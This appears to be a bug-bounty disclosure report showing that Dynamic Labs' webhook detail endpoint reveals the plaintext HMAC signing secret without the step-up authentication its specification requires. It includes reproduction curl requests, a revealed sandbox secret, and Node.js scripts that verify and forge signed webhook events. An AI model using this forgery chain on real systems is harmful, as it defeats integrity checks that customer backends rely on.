# BUG-001 — Step-up authentication not enforced on webhook signing secret reveal → HMAC-signed webhook event forgery chain

- **Researcher:** zeno0 (zeno0@bugcrowdninja.com)
- **Target:** `app.dynamicauth.com` / `app.dynamic.xyz` (same-origin `/api/v0` proxy) — Dynamic Labs Managed Bug Bounty
- **Endpoint:** `GET /api/v0/environments/{environmentId}/webhooks/{webhookId}?includeSecret=true`
- **Suggested severity:** **P3** (argued **P2** — see Severity rationale)
- **VRT:** `Server Security Misconfiguration → Missing Step-Up/Re-Authentication on Sensitive Action` (alt: `Broken Access Control → Privileged Action Without Re-Authentication`)
- **Status:** Confirmed & re-verified live. Original discovery 2026-10-25T23:27Z; re-verified 2026-10-25T23:46–23:47 UTC (same session, both bypass variants + control all reproduce).
- **Test environment:** researcher-owned sandbox `7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6` (all identifiers/secrets below belong to the researcher's own test environment).

---

## 1. Summary

The public OpenAPI specification (`https://app.dynamic.xyz/api-docs/public-api.yaml`, `components/parameters/includeSecret`) states that revealing a webhook's plaintext HMAC signing secret requires **step-up authentication** — a valid elevated access token with the `console:webhook_secret:reveal` scope minted for the calling user, sent in the `x-dyn-elevated-access-token` header, *"or the request is rejected with 403."*

In production, this gate is **not enforced at all**:

1. A regular 24h session JWT (`scope=user:basic`) alone returns the plaintext signing secret with `200 OK`.
2. The `x-dyn-elevated-access-token` header is accepted **completely unvalidated** — any garbage string yields the same `200`.
3. The revealed secret is the **real HMAC-SHA256 webhook signing key**: recomputing `HMAC-SHA256(secret, rawBody)` over a genuine captured delivery reproduces the `x-dynamic-signature-256` header **exactly**.
4. Therefore any holder of a (stolen/XSS'd/proxy-logged) session token can forge webhook events with signatures **indistinguishable from genuine Dynamic webhooks** — defeating the sole purpose of the signature, which is to let customer backends trust incoming events (auto-fulfillment, crediting, KYC gating, access grants).

The threat model is exactly the one step-up auth exists for: the spec's own docs describe Step-Up Auth for key export (shipped Apr 2026) as protection against a compromised *active* session. That protection silently does not exist on this endpoint.

---

## 2. Specification vs. reality

**Spec (`public-api.yaml` → `#/components/parameters/includeSecret`):**

```yaml
includeSecret:
  in: query
  name: includeSecret
  schema:
    type: boolean
  required: false
  description: "Include the plaintext signing secret in the response. Requires
    step-up authentication: a valid elevated access token with the
    `console:webhook_secret:reveal` scope, minted for the calling user, must
    be sent in the `x-dyn-elevated-access-token` header or the request is
    rejected with 403."
```

**Reality (re-verified 2026-10-25T23:46 UTC):**

| # | Request variant | Expected (per spec) | Observed |
|---|---|---|---|
| 1 | Session JWT only | `403` | **`200` + plaintext secret** |
| 2 | Session JWT + `x-dyn-elevated-access-token: garbage-invalid-token-xyz-123` | `403` | **`200` + plaintext secret** (header unvalidated) |
| 3 | Control: `GET .../webhooks?includeSecret=true` (list endpoint) | secret omitted | secret omitted — leak is specific to the **detail** endpoint |
| 4 | Control: captcha settings `secretKey` | masked | masked (`hasSecretKey: true`, write-only) — proving Dynamic *can* and does mask comparable secrets elsewhere |

---

## 3. Steps to reproduce

All requests are complete and copy-pasteable. Replace `<SESSION_JWT>` with a valid Dynamic console session JWT (obtainable by logging into `app.dynamic.xyz` with any test account and copying the `Authorization: Bearer` token from any dashboard API call; the researcher's token is in Burp history / provided to triage on request).

### Step 3.1 — Reveal the secret with the plain session JWT (no step-up)

```bash
curl -s "https://app.dynamicauth.com/api/v0/environments/7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6/webhooks/721f79c5-572e-4d64-869d-680268d164b4?includeSecret=true" \
  -H "Authorization: Bearer <SESSION_JWT>" \
  -H "X-Request-Purpose: Research" \
  -H "X-Bugcrowd-Ninja: zeno0"
```

**Observed response (HTTP 200):**

```json
{"enabledAt":"2026-10-25T23:27:34.972Z","updatedAt":"2026-10-25T23:27:34.972Z","url":"https://webhook.site/72e683f6-959e-4264-8aa8-82f389ed746d","secret":"dyn_Qfvm49E4cdO0AewRTjk{PAGBhx2t[RNpVMqajPTaQaq4Yme[f12LQka9","version":"1.1.0","createdAt":"2026-10-25T23:27:34.972Z","environmentId":"7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6","webhookId":"721f79c5-572e-4d64-869d-680268d164b4","events":["user.created"],"isEnabled":true}
```

→ `secret` is returned in plaintext. No `403`, no step-up challenge, no OTP.

### Step 3.2 — Prove the elevated-access-token header is unvalidated

```bash
curl -s "https://app.dynamicauth.com/api/v0/environments/7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6/webhooks/721f79c5-572e-4d64-869d-680268d164b4?includeSecret=true" \
  -H "Authorization: Bearer <SESSION_JWT>" \
  -H "x-dyn-elevated-access-token: garbage-invalid-token-xyz-123" \
  -H "X-Request-Purpose: Research" \
  -H "X-Bugcrowd-Ninja: zeno0"
```

**Observed:** identical `200` + plaintext secret. The server does not parse, validate scope, or even sanity-check the header — the step-up gate is absent server-side, not merely bypassable.

### Step 3.3 — Trigger a genuine webhook delivery and capture its signature

A webhook was configured on the researcher's sandbox pointing to `https://webhook.site/72e683f6-959e-4264-8aa8-82f389ed746d`. Creating a test user (`whtrigger+x1@example.com`) fired the `user.created` event. The captured delivery headers include:

```
x-dynamic-webhook-version: 1.1.0
x-dynamic-signature-256: sha256=38260fc64e8a6ade544387e47d7b27946b1dff9545516e0effcae1eae60339b9
```

### Step 3.4 — Verify the leaked secret IS the real signing key (HMAC exact match)

```javascript
// hmac_verify.js
const crypto = require('crypto');
const SECRET = 'dyn_Qfvm49E4cdO0AewRTjk{PAGBhx2t[RNpVMqajPTaQaq4Yme[f12LQka9';
// full raw body of the genuine delivery captured from webhook.site (unmodified bytes)
const rawBody = `<RAW_DELIVERY_BODY>`; // messageId 18533c96-95ec-4053-b635-8040574cc567
const captured = '38260fc64e8a6ade544387e47d7b27946b1dff9545516e0effcae1eae60339b9';
const computed  = crypto.createHmac('sha256', SECRET).update(rawBody, 'utf8').digest('hex');
console.log(computed === captured); // → true  (EXACT MATCH)
```

**Output (run 2026-10-25T23:47 UTC):**

```
captured sig: 38260fc64e8a6ade544387e47d7b27946b1dff9545516e0effcae1eae60339b9
HMAC(rawBody)  38260fc64e8a6ade544387e47d7b27946b1dff9545516e0effcae1eae60339b9   <<< MATCH
HMAC(timestamp.body)   c36df581293e0977c2b1765620ec74859b3d57b409fa93f3c3cd34df3d259847
HMAC(body+timestamp)   f20b2d2db6ef4f68e2c917886d3c5cde69818b29f1c03411828775852f642358
HMAC(messageId.body)   5c7357f8c462b2f199e7e38009cbb12a8514f90f18c56e5e054d30c97198fa10
```

Signing scheme confirmed: plain `HMAC-SHA256(secret, rawBody)`, hex-encoded, `sha256=`-prefixed. No canonicalization, no timestamp mixing — trivially reproducible by an attacker.

### Step 3.5 — Forge an event a customer backend would trust

```javascript
const forged = JSON.stringify({
  messageId: crypto.randomUUID(),
  eventId: crypto.randomUUID(),
  eventName: 'user.created',
  timestamp: new Date().toISOString(),
  webhookId: '721f79c5-572e-4d64-869d-680268d164b4',
  userId: 'attacker-chosen-user-id',
  environmentId: '7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6',
  environmentName: 'sandbox',
  data: { id: 'attacker-chosen-user-id', email: 'attacker@evil.example', kycStatus: 'verified' },
});
const sig = crypto.createHmac('sha256', SECRET).update(forged, 'utf8').digest('hex');
// POST forged + header "x-dynamic-signature-256: sha256=<sig>" to any customer webhook receiver
```

**Output:**

```
FORGED payload signature: 877e5f3a36b351d784684772a18f7c6e7c1a5949717f8ac93a767f60939485f7
```

Byte-for-byte identical structure and signing scheme as genuine Dynamic deliveries. A customer backend that verifies `x-dynamic-signature-256` — the documented, recommended integration pattern — accepts forged events with zero indicators.

---

## 4. Impact

**Attack chain:** stolen / XSS'd / mitm-proxy-logged console session (the precise threat step-up auth exists to mitigate) → one unauthenticated-step GET → real signing secret → forge arbitrary `user.created`, `wallet.linked`, `transaction.*` etc. events with valid HMACs → customer backend trusts them.

Concrete downstream scenarios in Dynamic's customer base:

- **Commerce / fulfillment:** forged `payment.succeeded`-class events auto-release goods or credit balances without payment.
- **KYC / compliance gating:** forged `kyc.approved` / `user.created` (with `kycStatus: verified`) flags attacker-controlled identities as compliant.
- **Access control by webhook:** systems that provision access/roles on `user.created` / `wallet.linked` events grant attacker-chosen access.
- **Silent persistence:** forged events leave no trace in Dynamic's audit logs (they never traverse Dynamic's servers), making attribution hard for victims.

**Why the missing gate matters:** Dynamic's own spec defines a dedicated scope (`console:webhook_secret:reveal`) and header (`x-dyn-elevated-access-token`) for exactly this action, and markets Step-Up Auth for key export (Apr 2026). The security control is specified, implemented in the API contract, and advertised — but not enforced in production code. Any exploit primitive that yields a session token (XSS, malicious browser extension, corporate proxy, token leakage in logs) converts directly into webhook-forgery capability, whereas with the specified control it would not.

**Severity rationale:** submitted as P3 under `Server Security Misconfiguration → Missing Step-Up Authentication`. The researcher argues P2 because (a) the compromise of an HMAC signing secret with zero re-authentication is a full defeat of a documented security control, and (b) the forge primitive directly targets customer production integrations, not just the researcher's own console. A pending role-based test (viewer-role member invoking the same call — invite in progress) would escalate this to a broken-access-control finding if a least-privileged role can also reveal the secret; triage will be updated if it reproduces.

---

## 5. Evidence this is unintended behavior (anti-false-positive controls)

1. **Spec-vs-behavior delta:** the spec explicitly promises `403` without a valid elevated token; production returns `200`. This is not "documented by omission" — it is a specified control that does not work.
2. **Captcha secret is correctly protected** (`hasSecretKey: true`, write-only, never returned) — Dynamic's comparable secret-masking works elsewhere; the webhook detail endpoint is the specific gap.
3. **List endpoint ignores `includeSecret`** — only the detail endpoint leaks, indicating an implementation inconsistency rather than intentional design.
4. **HMAC exact match** proves the value returned is the production signing key, not a decoy or per-request placeholder.
5. Scope enum contains `console:webhook_secret:reveal` specifically for this action — dead code server-side.

---

## 6. Suggested remediation

1. Enforce the specified gate server-side on `GET /environments/{environmentId}/webhooks/{webhookId}` when `includeSecret=true`: validate `x-dyn-elevated-access-token` (signature, expiry, audience) **and** verify it carries `console:webhook_secret:reveal` minted for the calling user; otherwise return `403` as specified.
2. Defense-in-depth: return the secret masked by default (`dyn_Qfvm…Qka9`, last 4 chars) with an explicit "reveal" action; offer rotation (`POST .../webhooks/{id}/rotate-secret`) and rotate automatically on reveal.
3. Audit all endpoints documented as requiring step-up (e.g., key export) for the same missing-enforcement class; add a server-side integration test asserting `403` without a valid elevated token.
4. Consider per-delivery signing keys or asymmetric signing (Ed25519/JWT with `kid`) to limit blast radius of any single secret disclosure.

---

## 7. Supporting artifacts

- `recon/reverify_t1_234648.txt` — Test 1 response (plain JWT → 200 + secret), 2026-10-25T23:46:48 UTC
- `recon/reverify_t2_234657.txt` — Test 2 response (garbage elevated token → 200 + secret), 2026-10-25T23:46:57 UTC
- `recon/hmac_verify_fresh.txt` — HMAC match + forgery signature output, 2026-10-25T23:47 UTC
- `scripts/hmac_verify.js` — verification/forgery script
- `recon/public-api.yaml` — captured production OpenAPI spec (includeSecret description quoted verbatim in §2)
- webhook.site inbox `72e683f6-959e-4264-8aa8-82f389ed746d` — genuine deliveries (ping 23:27:35Z, `user.created` 23:27:51Z) with original headers/bodies
- Test webhook: `721f79c5-572e-4d64-869d-680268d164b4` on researcher sandbox env `7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6`

*All identifiers, tokens and secrets referenced belong to the researcher's own test environment. The console session JWT is intentionally redacted here and is available to triage via the Bugcrowd submission form / researcher's Burp history.*
